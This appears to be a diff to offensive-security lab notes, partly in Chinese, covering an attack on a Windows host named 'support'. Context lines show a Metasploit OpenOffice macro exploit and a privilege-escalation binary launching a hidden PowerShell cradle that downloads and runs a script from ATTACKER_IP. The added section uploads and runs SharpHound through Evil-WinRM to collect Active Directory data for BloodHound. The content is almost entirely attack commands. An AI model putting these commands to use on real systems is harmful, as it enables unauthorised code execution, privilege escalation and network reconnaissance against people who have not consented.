@@ -16,3 +16,20 @@ msf6 exploit(multi/misc/openoffice_document_macro) > set cmd "powershell.exe -no
 c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.txt');"
 ```
 ————————————————————————————————————
+#### BloodHound form Support 
+```
+[★]$ sudo neo4j start
+https://github.com/SpecterOps/BloodHound-Legacy/releases
+[★]$ unzip BloodHound-linux-x64.zip
+
+从远程收集数据在我们继续之前。为此，让我们继续在本地克隆BloodHound GitHub项目https://github.com/SpecterOps/BloodHound-Legacy
+[★]$ git clone https://github.com/BloodHoundAD/BloodHound
+[★]$ ls BloodHound/Collectors/
+AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
+
+*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
+*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe
+得到20260131001204_BloodHound.zip 
+导入到 
+[~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
+```
